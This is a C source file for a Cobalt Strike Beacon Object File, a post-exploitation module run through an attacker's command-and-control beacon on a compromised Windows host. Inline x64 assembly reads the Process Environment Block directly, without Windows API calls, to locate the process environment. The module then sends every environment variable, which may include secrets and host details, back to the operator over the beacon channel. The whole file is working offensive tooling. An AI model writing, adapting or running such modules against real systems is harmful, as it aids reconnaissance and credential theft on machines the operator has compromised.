#include <windows.h>
#include "beacon.h"
//#define DEBUG_BOF

PVOID getProcessParamsAddr()
{
    PVOID procParamAddr = NULL;
    __asm__(
        "mov r10, 0 \n"           // R10 = 0x0 - Null out some registers
        "mul r10 \n"              // RAX&RDX = 0x0
        "add al, 0x60 \n"         // RAX = 0x60 = Offset of PEB Address within the TEB
        "mov rdx, gs:[rax] \n"    // RDX = PEB Address
        "mov rax, [rdx+0x20] \n"  // ProcessParameters Address
        "mov %[procParamAddr], rax \n"
	:[procParamAddr] "=r" (procParamAddr)
    );
    return procParamAddr;
}

PVOID getEnvironmentAddr(PVOID procParamAddr)
{
    PVOID environmentAddr = NULL;
    __asm__(
        "mov rdx, %[procParamAddr] \n"
        "mov rax, [rdx+0x80] \n"       // Environment Address
        "mov %[environmentAddr], rax \n"
	:[environmentAddr] "=r" (environmentAddr)
	:[procParamAddr] "r" (procParamAddr)
    );
    return environmentAddr;
}

PVOID getEnvironmentSize(PVOID procParamAddr)
{
    PVOID environmentSize = NULL;
    __asm__(
        "mov rax, %[procParamAddr] \n"
        "mov rax, [rax+0x3f0] \n" // Environment Size
        "mov %[environmentSize], rax \n"
        : [environmentSize] "=r"(environmentSize)
        : [procParamAddr] "r"(procParamAddr)
    );
    return environmentSize;
}

PVOID getUnicodeStrLen(PVOID envStrAddr)
{
    PVOID unicodeStrLen = NULL;
    __asm__(
        "mov rax, %[envStrAddr] \n"
        "mov rdx, 0 \n" // our 0x00 null to compare the string position too
        "mov rcx, 0 \n" // our string length counter
    "check: \n"
        "inc rcx \n"
        "cmp dl, [rax + rcx] \n"
        "jne check \n"
        "inc rcx \n" 
        "cmp dl, [rax + rcx] \n"
        "jne check \n"
        "mov %[unicodeStrLen], rcx \n"
	:[unicodeStrLen] "=r" (unicodeStrLen)
	:[envStrAddr] "r" (envStrAddr)
    );
    return unicodeStrLen;
}

void printLoopAllTheStrings(PVOID nextEnvStringAddr, unsigned __int64 environmentSize)
{
    formatp stringFormatObject;  // Cobalt Strike beacon format object we will pass strings too
    BeaconFormatAlloc(&stringFormatObject, 64 * 1024); // allocate memory for our string blob
    PVOID unicodeStrSize = NULL;
    PVOID environmentEndAddr = nextEnvStringAddr + environmentSize;
    while (nextEnvStringAddr < environmentEndAddr)
    {
        BeaconFormatPrintf(&stringFormatObject,"%ls\r\n",nextEnvStringAddr);
        //BeaconPrintf(CALLBACK_OUTPUT, "%ls",nextEnvStringAddr);
        unicodeStrSize = getUnicodeStrLen(nextEnvStringAddr)+2;
        nextEnvStringAddr += (unsigned __int64)unicodeStrSize;
    }
    int sizeOfObject   = 0;
    char* outputString = NULL;
    outputString = BeaconFormatToString(&stringFormatObject, &sizeOfObject);
    BeaconOutput(CALLBACK_OUTPUT, outputString, sizeOfObject);
    BeaconFormatFree(&stringFormatObject);
}

void go(char *args, int len)
{
    PVOID procParamAddr = NULL;
    PVOID environmentAddr = NULL;
    PVOID environmentSize = NULL;
    procParamAddr = getProcessParamsAddr();
    environmentAddr = getEnvironmentAddr(procParamAddr);
    environmentSize = getEnvironmentSize(procParamAddr);
#ifdef DEBUG_BOF
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Evironment Address: %p",environmentAddr); 
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Evironment Size:    %d",environmentSize);
#endif
    printLoopAllTheStrings(environmentAddr, (unsigned __int64)environmentSize);
}
